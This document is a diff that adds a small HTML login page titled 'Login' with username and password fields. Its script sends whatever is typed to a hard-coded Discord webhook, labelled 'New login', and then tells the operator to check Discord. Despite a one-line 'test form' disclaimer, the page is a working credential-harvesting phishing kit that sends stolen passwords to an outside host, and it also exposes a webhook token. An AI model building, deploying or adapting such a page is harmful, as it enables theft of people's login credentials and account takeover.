@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f2f2f2;
+      font-family: sans-serif;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #aaa;
+    }
+    input {
+      display: block;
+      margin: 10px 0;
+      padding: 10px;
+      width: 100%;
+    }
+    button {
+      padding: 10px;
+      width: 100%;
+      background: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="sendData()">Submit</button>
+    <p style="font-size: 12px; color: red; margin-top: 10px;">
+      Warning: This is a test form. Don’t enter real info!
+    </p>
+  </div>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const webhookURL = "https://discord.com/api/webhooks/1376166182880673904/Rn27hb5fXT6jDQZT9VqBdPLbXTF3Hne8CsGdNJcshv66iM9yYvLW58Bp_Amm9dYL-yoy";
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `New login:\nUsername: ${username}\nPassword: ${password}`
+        })
+      }).then(() => {
+        alert("Data sent! Check your Discord.");
+      }).catch(err => {
+        alert("Error: " + err);
+      });
+    }
+  </script>
+</body>
+    </html>
